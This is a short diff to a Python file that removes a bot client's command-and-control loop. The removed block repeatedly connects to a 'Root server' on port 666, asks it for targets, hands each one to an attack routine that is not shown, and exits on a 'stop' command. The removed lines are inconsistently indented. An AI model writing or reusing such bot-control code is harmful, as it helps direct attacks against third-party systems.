@@ -54,33 +54,7 @@ def useragent_list():
 
 
 #########################################
- root = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    root_ip = "localhost"
-    if len(sys.argv) > 1:
-        root_ip = sys.argv[1]
-    print("Trying to establish connection with Root server.")
-    while True:  # Persistent Connection
-        try:
-            root.connect((root_ip, 666))
-            print(f"Connected to {root_ip}:{666}!")
-            break
-        except (
-            ConnectionRefusedError,
-            ConnectionAbortedError,
-            ConnectionError
-        ):
-            continue
-    root.sendall("Requesting Target.".encode())
-    while True:
-        command = root.recv(1024)  # Target
-        target = command.decode()
-        if target.lower() == "stop":
-            root.sendall("Disconnecting".encode())
-            root.close()
-            sys.exit(0)
-        root_status = asyncio.run(main(root, target))
-        if root_status < 0:
-		sys.exit(0)
+
 ########################################
 
 
